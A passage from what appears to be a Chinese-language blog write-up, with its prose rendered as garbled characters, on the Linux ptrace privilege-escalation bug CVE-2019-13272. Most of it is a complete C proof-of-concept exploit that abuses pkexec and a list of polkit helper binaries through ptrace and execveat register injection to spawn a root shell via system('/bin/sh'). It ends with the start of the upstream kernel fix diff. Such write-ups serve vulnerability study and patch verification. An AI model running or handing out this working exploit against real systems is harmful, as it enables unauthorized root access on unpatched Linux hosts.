class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> </span><br><span class="line">    &#123;</span><br><span class="line">        .iov_base = &amp;regs,</span><br><span class="line">        .iov_len = <span class="keyword">sizeof</span>(regs),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">size_t</span> child_stack;</span><br><span class="line">    <span class="type">size_t</span> insert_data[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SYSCALL, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">// wait for child meeting a syscall</span></span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);    <span class="comment">// wait for child to execve</span></span><br><span class="line">    ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &amp;iov); <span class="comment">// get env of child</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// prepare the stack data</span></span><br><span class="line">    child_stack = (regs.rsp - <span class="number">0x1000</span>) &amp; ~<span class="number">0xfff</span>UL; </span><br><span class="line">    <span class="built_in">memset</span>(insert_data, <span class="number">0</span>, <span class="keyword">sizeof</span>(insert_data));</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = child_stack + <span class="number">0x18</span>;    <span class="comment">// argv arrays</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// env arrays</span></span><br><span class="line">    insert_data[idx++] = *(<span class="type">size_t</span>*)argv;          <span class="comment">// argv[0]</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// path</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy to child stack</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx; i++)</span><br><span class="line">        ptrace(PTRACE_POKETEXT, child_pid, child_stack + i * <span class="keyword">sizeof</span>(<span class="type">size_t</span>), insert_data[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// execveat(exec_fd, NULL, argv, NULL, flags)</span></span><br><span class="line">    regs.orig_rax = __NR_execveat;</span><br><span class="line">    regs.rdi = exec_fd;</span><br><span class="line">    regs.rsi = child_stack + <span class="number">0x20</span>;  <span class="comment">// path -&gt; NULL</span></span><br><span class="line">    regs.rdx = child_stack;         <span class="comment">// argv -&gt; &quot;stagex&quot;, NULL</span></span><br><span class="line">    regs.r10 = child_stack + <span class="number">0x10</span>;  <span class="comment">// envp -&gt; NULL</span></span><br><span class="line">    regs.r8  = AT_EMPTY_PATH;       <span class="comment">// flags</span></span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &amp;iov);</span><br><span class="line">    ptrace(PTRACE_DETACH, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Final-EXP"><a href="#Final-EXP" class="headerlink" title="Final EXP"></a>Final EXP</h3><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/elf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pwd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *helper_list[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;/usr/lib/gnome-settings-daemon/gsd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/unity-settings-daemon/usd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/sbin/mate-power-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/bin/xfpm-power-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/bin/lxqt-backlight_backend&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/libexec/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/libexec/gsd-wacom-oled-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/libexec/gsd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gsd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gsd-wacom-oled-helper&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *helper = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *helper_basename = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> pipe_for_block[<span class="number">2</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> self_fd;</span><br><span class="line"><span class="type">pid_t</span> pid_task_b;</span><br><span class="line"><span class="type">pid_t</span> pid_task_c;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">findHelper</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">middleStage</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">middlePtracee</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">finalPtracee</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">forceChildToExecve</span><span class="params">(<span class="type">pid_t</span> child_pid, <span class="type">int</span> exec_fd, <span class="type">char</span> *argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mainly for task a, and jmp for stage 2 and 3</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage2&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> middleStage();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage3&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> getRootShell();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] CVE-2019-13272 POC of local privileged.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Written by arttnba3.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start exploiting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the helper</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Finding the helper...&quot;</span>);</span><br><span class="line">    helper = findHelper();</span><br><span class="line">    helper_basename = basename(helper);</span><br><span class="line">    <span class="keyword">if</span> (!helper)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Unable to find suitable helper on your platform!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Using helper: %s\n&quot;</span>, helper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create the pipe for blocking child</span></span><br><span class="line">    pipe2(pipe_for_block, O_DIRECT | O_CLOEXEC); <span class="comment">// set the pipe in packet mode, which meant that the data should be received in packets</span></span><br><span class="line">    fcntl(pipe_for_block[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_for_block[<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>); <span class="comment">// temp packet to make the following ones stuck, the stdout of task B will be redirect to it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fork out task B</span></span><br><span class="line">    <span class="comment">// two kinds of writing, all OK</span></span><br><span class="line">    <span class="comment">// pid_task_b = clone(middlePtracee, (size_t)malloc(0x1000 * 100) + 0x1000 * 100, CLONE_VM | CLONE_VFORK | SIGCHLD, NULL);</span></span><br><span class="line">    pid_task_b = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_b)</span><br><span class="line">    &#123;</span><br><span class="line">        middlePtracee();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/comm&quot;</span>, pid_task_b);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> comm[<span class="number">0x100</span>];</span><br><span class="line">        <span class="type">int</span> comm_fd = open(buf, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (comm_fd &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Failed to read comm of task B!\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        comm[read(comm_fd, comm, <span class="number">0x100</span> - <span class="number">1</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(comm, helper_basename, <span class="number">10</span>))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        usleep(<span class="number">100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// task B got the root, wait a while it&#x27;ll lose privilege, then task A attach to it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Task A attaching to task B soooon...&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_ATTACH, pid_task_b, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(pid_task_b, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">// 0 means no extra options</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// force the task B to execve stage2</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Forcing task B to execve stage2...&quot;</span>);</span><br><span class="line">    forceChildToExecve(pid_task_b, <span class="number">0</span>, <span class="string">&quot;stage2&quot;</span>);</span><br><span class="line">    <span class="comment">//force_exec_and_wait(pid_task_b, 0, &quot;stage2&quot;);</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">findHelper</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">buf</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(helper_list) / <span class="keyword">sizeof</span>(<span class="type">char</span>*); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!stat(helper_list[i], &amp;buf))</span><br><span class="line">            <span class="keyword">return</span> helper_list[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middlePtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    self_fd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span> =</span> getpwuid(getuid());</span><br><span class="line">    pid_task_b = getpid();</span><br><span class="line"></span><br><span class="line">    pid_task_c = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_c)</span><br><span class="line">        <span class="keyword">return</span> finalPtracee();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[+] Task B fork out task C.\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[*] Task B execve pkexec soooon...\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    dup2(self_fd, <span class="number">0</span>); <span class="comment">// got stdin close</span></span><br><span class="line">    dup2(pipe_for_block[<span class="number">1</span>], <span class="number">1</span>); <span class="comment">// redirect stdout to block it</span></span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, basename(<span class="string">&quot;/usr/bin/pkexec&quot;</span>), <span class="string">&quot;--user&quot;</span>, pw-&gt;pw_name, helper, <span class="string">&quot;--helper&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrive there, we failed.</span></span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to execve pkexec!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middleStage</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> child = waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    forceChildToExecve(child, <span class="number">114</span>, <span class="string">&quot;stage3&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">finalPtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    pid_task_c = getpid();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">char</span> needle[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">char</span> uid_buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> task_B_status_fd;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(needle, <span class="string">&quot;/proc/%d/status&quot;</span>, pid_task_b);</span><br><span class="line">    <span class="built_in">sprintf</span>(uid_buf, <span class="string">&quot;Uid:\t%d\t0\t&quot;</span>, getuid());</span><br><span class="line">    dup2(self_fd, <span class="number">114</span>);</span><br><span class="line">    task_B_status_fd = open(needle, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (task_B_status_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to get status of task B!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check out uid of task B</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[pread(task_B_status_fd, buf, <span class="number">0x1000</span> - <span class="number">1</span>, <span class="number">0</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, uid_buf)) <span class="comment">// task B got root</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let task B(root) be ptracer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Task B is root now!&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Task C execve another suid programme sooooon...&quot;</span>);</span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/passwd&quot;</span>, <span class="string">&quot;passwd&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrived there, execve failed </span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Task C failed to execve!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// force a child to execve by ptrace through execveat syscall</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">forceChildToExecve</span><span class="params">(<span class="type">pid_t</span> child_pid, <span class="type">int</span> exec_fd, <span class="type">char</span> *argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> </span><br><span class="line">    &#123;</span><br><span class="line">        .iov_base = &amp;regs,</span><br><span class="line">        .iov_len = <span class="keyword">sizeof</span>(regs),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">size_t</span> child_stack;</span><br><span class="line">    <span class="type">size_t</span> insert_data[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SYSCALL, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">// wait for child meeting a syscall</span></span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);    <span class="comment">// wait for child to execve</span></span><br><span class="line">    ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &amp;iov); <span class="comment">// get env of child</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// prepare the stack data</span></span><br><span class="line">    child_stack = (regs.rsp - <span class="number">0x1000</span>) &amp; ~<span class="number">0xfff</span>UL; </span><br><span class="line">    <span class="built_in">memset</span>(insert_data, <span class="number">0</span>, <span class="keyword">sizeof</span>(insert_data));</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = child_stack + <span class="number">0x18</span>;    <span class="comment">// argv arrays</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// env arrays</span></span><br><span class="line">    insert_data[idx++] = *(<span class="type">size_t</span>*)argv;          <span class="comment">// argv[0]</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// path</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy to child stack</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx; i++)</span><br><span class="line">        ptrace(PTRACE_POKETEXT, child_pid, child_stack + i * <span class="keyword">sizeof</span>(<span class="type">size_t</span>), insert_data[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// execveat(exec_fd, NULL, argv, NULL, flags)</span></span><br><span class="line">    regs.orig_rax = __NR_execveat;</span><br><span class="line">    regs.rdi = exec_fd;</span><br><span class="line">    regs.rsi = child_stack + <span class="number">0x20</span>;  <span class="comment">// path -&gt; NULL</span></span><br><span class="line">    regs.rdx = child_stack;         <span class="comment">// argv -&gt; &quot;stagex&quot;, NULL</span></span><br><span class="line">    regs.r10 = child_stack + <span class="number">0x10</span>;  <span class="comment">// envp -&gt; NULL</span></span><br><span class="line">    regs.r8  = AT_EMPTY_PATH;       <span class="comment">// flags</span></span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &amp;iov);</span><br><span class="line">    ptrace(PTRACE_DETACH, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒ</p><p><img src="https://s2.loli.net/2022/01/17/VgmbRFaIZo3qY8u.png" alt="image.png"></p><h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03.æ¼æ´ä¿®å¤"></a>0x03.æ¼æ´ä¿®å¤</h1><p>Jann Horn æäº¤çš„æ¼æ´ä¿®å¤æ–¹æ¡ˆæ¯”è¾ƒç®€å•ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/kernel/ptrace.c b/kernel/ptrace.c</span></span><br><span class="line"><span class="comment">index 8456b6e2205f7..705887f63288d 100644</span></span><br><span class="line"><span class="comment">--- a/kernel/ptrace.c</span></span><br><span class="line"><span class="comment">+++ b/kernel/ptrace.c</span></span><br><span class="line"><span class="meta">@@ -79,9 +79,7 @@</span> void __ptrace_link(struct task_struct *child, struct task_struct 